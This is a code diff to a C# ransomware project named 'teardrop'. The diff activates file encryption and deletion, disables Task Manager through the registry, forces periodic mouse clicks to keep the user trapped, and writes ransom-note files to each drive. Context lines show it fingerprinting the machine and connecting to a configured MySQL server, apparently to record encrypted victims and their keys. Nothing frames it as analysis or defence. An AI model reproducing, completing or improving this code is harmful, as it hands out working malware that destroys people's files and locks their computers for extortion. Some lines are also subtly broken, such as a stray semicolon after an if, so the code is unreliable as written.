@@ -1,4 +1,5 @@
 ﻿using DeviceId;
+using Microsoft.Win32;
 using MySql.Data.MySqlClient;
 using System;
 using System.Collections.Generic;
@@ -23,9 +24,22 @@ namespace teardrop
             InitializeComponent();
         }
 
+        public void Log(string text, string title)
+        {
+            try
+            {
+                if (File.Exists(Application.StartupPath + "\\log.txt"));
+                {
+                    File.AppendAllText(Application.StartupPath + "\\log.txt",
+                        Environment.NewLine + Environment.NewLine + title + " ]=================================" + Environment.NewLine + text);
+                }
+            } catch { }
+        }
+
 
         private void Form1_Load(object sender, EventArgs e)
-        {            
+        {           
+            // Check if Encryption/Decryption Key was ever created on that machine
             if(Properties.Settings.Default.key.Length != 34)
             {
                 Properties.Settings.Default.key = Crypto.GetRandomString(34);
@@ -40,28 +54,63 @@ namespace teardrop
                 write("Key is: " + Properties.Settings.Default.key);
             }
 
+            // If disable_taskmgr is true, disable task manager. else, enable.
+            if (Properties.Settings.Default.disable_taskmgr == true)
+            {
+                try
+                {
+                    DisableTaskManager();
+                }
+                catch (Exception ex)
+                {
+                    Log(ex.Message, "Form1_Load > DisableTaskManager");
+                }
+            }
+            else
+            {
+                try
+                {
+                    EnableTaskManager();
+                }
+                catch (Exception ex)
+                {
+                    Log(ex.Message, "Form1_Load > EnableTaskManager");
+                }
+            }
 
-            //this.WindowState = FormWindowState.Maximized;
+
+            // Simple "Styling"
             this.ShowInTaskbar = false;
             this.Text = "";
             this.ShowIcon = false;
             this.TopMost = true;
 
+            
             timer1.Enabled = true;
             timer1.Start();
 
             label1.Text = Properties.Settings.Default.application_title;
 
+            // Center Visuals
             panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
             label1.Location = new Point(panel_main.Width / 2 - label1.Width / 2, label1.Location.Y);
 
+            string deviceId = "";
 
-            string deviceId = new DeviceIdBuilder()
-                .AddMachineName()
-                .AddProcessorId()
-                .AddMotherboardSerialNumber()
-                .AddSystemDriveSerialNumber()
-                .ToString();
+            try
+            {
+                // Generate Devive ID for Database to identify encrypted machines
+                deviceId = new DeviceIdBuilder()
+                    .AddMachineName()
+                    .AddProcessorId()
+                    .AddMotherboardSerialNumber()
+                    .AddSystemDriveSerialNumber()
+                    .ToString();
+            }
+            catch(Exception DeviceIdError)
+            {
+                Log(DeviceIdError.Message, "Form1_Load > DevideId");
+            }
 
             string myConnectionString = "SERVER=" + Properties.Settings.Default.db_host + ";" +
                             "DATABASE=" + Properties.Settings.Default.db_database + ";" +
@@ -97,13 +146,33 @@ namespace teardrop
                     }
                     else
                     {
-                        MessageBox.Show(ex.Message);
+                        Log(ex.Message, "Form1_Load > MySQL");
                     }
                 }
             }
 
 
             Task.Run(() => GetFiles());
+        }
+
+        public void DisableTaskManager()
+        {
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
+            {
+                objRegistryKey.SetValue("DisableTaskMgr", "1");
+            }
+            objRegistryKey.Close();
+        }
+
+        public void EnableTaskManager()
+        {
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
+            {
+                objRegistryKey.DeleteValue("DisableTaskMgr");
+            }
+            objRegistryKey.Close();
         }
 
         public void write(string text)
@@ -142,6 +211,7 @@ namespace teardrop
                                 ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
                             };
 
+                            // "skipPath" is experimental and currently not working
                             var skipPath = new[]
                             {
                                 "System32", "WinSxS", "Program Files"
@@ -149,7 +219,6 @@ namespace teardrop
 
                             if (validExtensions.Contains(ext))
                             {
-                                // Uncomment Line below to encrypt files
                                 Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
 
                                 try
@@ -159,6 +228,7 @@ namespace teardrop
                                 catch(Exception ex2)
                                 {
                                     write("Cant delete file " + ex2.Message);
+                                    Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
                                 }
 
                                 write("Encrypted " + s);
@@ -170,7 +240,7 @@ namespace teardrop
                     }
                 }
             }
-            catch (Exception e) { write(e.Message); }
+            catch (Exception e) { write(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error"); }
             
         }
 
@@ -196,6 +266,7 @@ namespace teardrop
                             catch (Exception ex2)
                             {
                                 write("Cant delete file " + ex2.Message);
+                                Log(ex2.Message, "GetFiles > File Delete Error");
                             }
                         }
                         else
@@ -203,9 +274,9 @@ namespace teardrop
 
                         }
                     }
-                    catch
+                    catch (Exception ex)
                     {
-
+                        Log(ex.Message, "Getfiles > General Error");
                     }
                 }
 
@@ -214,6 +285,25 @@ namespace teardrop
                 // Now Encrypt whole hard drive
                 foreach (var drive in DriveInfo.GetDrives())
                 {
+
+                    // This will try to create message in eighter plain text file or html file. 
+                    try
+                    {
+                        if(Properties.Settings.Default.message_html.Length > 0)
+                        {
+                            File.WriteAllText(drive.Name, Properties.Settings.Default.message_html);
+                        }
+                        if(Properties.Settings.Default.message_txt.Length > 0)
+                        {
+                            File.WriteAllText(drive.Name, Properties.Settings.Default.message_txt);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Log(ex.Message, "GetFiles > Create Message File");
+                    }
+
+
                     try
                     {
                         write("Found drive " + drive.Name);
@@ -227,12 +317,13 @@ namespace teardrop
                     catch (Exception ex1)
                     {
                         write("ex1 " + ex1.Message);
+                        Log(ex1.Message, "GetFiles > Drive Error");
                     }
                 }
             }
             catch(Exception ex)
             {
-
+                Log(ex.Message, "GetFiles > General Drive Error");
             }
 
             write("Done getting stuff :)");
@@ -258,7 +349,12 @@ namespace teardrop
             Point leftTop = new System.Drawing.Point(Screen.PrimaryScreen.WorkingArea.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
             Cursor.Position = leftTop;
 
-            //DoMouseClick();
+            // If mouse click is enabled (set to "true" in Project Settings) , the mouse will be clicked each intervall. 
+            // This might be a work around for diabling ALT + Tab etc...
+            if (Properties.Settings.Default.clickMouse == true)
+            {
+                DoMouseClick();
+            }
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
